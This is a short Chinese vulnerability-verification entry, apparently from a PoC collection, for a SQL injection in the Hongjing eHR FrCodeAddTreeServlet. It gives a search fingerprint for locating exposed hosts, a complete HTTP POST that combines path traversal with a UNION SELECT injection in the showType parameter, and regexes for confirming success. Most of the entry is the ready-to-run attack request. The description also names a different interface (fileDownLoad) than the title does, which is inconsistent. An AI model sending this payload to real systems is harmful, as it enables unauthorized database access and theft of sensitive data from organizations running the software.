﻿# 宏景eHR FrCodeAddTreeServlet SQL注入漏洞

> 更新时间：2024-02-01

> 漏洞编号：

> 漏洞说明：宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件。
宏景eHR fileDownLoad 接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞执行任意SQL指令，导致敏感数据泄露，从而造成危害。

> 漏洞特征：app="HJSOFT-HCM"

> 验证脚本：HTTP

```
POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?SQL)(?=.*?TreeNode).*?$

> 上传文件定位：


> 验证文件来源：宏景eHR FrCodeAddTreeServlet SQL注入漏洞.poc
